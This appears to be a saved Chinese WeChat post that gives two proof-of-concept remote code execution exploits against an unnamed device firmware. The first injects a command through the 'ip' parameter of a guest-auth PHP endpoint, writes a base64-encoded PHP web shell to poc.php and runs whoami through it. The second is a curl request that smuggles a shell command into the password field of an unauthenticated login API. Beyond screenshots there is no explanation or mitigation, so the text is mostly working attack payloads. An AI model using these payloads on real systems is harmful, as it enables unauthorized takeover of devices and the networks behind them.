> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hFQeIXNNWG158NJUAjuUEg)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBAFwB7rzTpcPTlDLqgfbhGhvTZ4wb0oDbe1kxY1znreVYZGXGU8X2UcA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K" | base64 -d POC: POST /guest_auth/guestIsUp.php ip=127.0.0.1|echo "PD9waHAKJGNtZD0kX0dFVFsnY21kJ107CnN5c3RlbSgkY21kKTsKPz4K"|base64 -d > poc.php&mac=00-00 GET /guest_auth/poc.php?cmd=whoami

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBA8ToeuBMbg9BplZxibrzkSfbeN6je8rsQmappzjMcdQArBEC7Px0OV7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

Another unauthorized RCE in same firmware PoC: curl http://host/openApi/devConfig.php?a=login -X POST -d "{\"admin\":\"admin\",\"encry\":true,\"password\":\"1'; COMMAND ;echo 'a\"}"

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBAsZyk8GkibtbfbeaoUuvwopE18gaq1BqOdRwt8vMP5E4LNURw95g6PPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)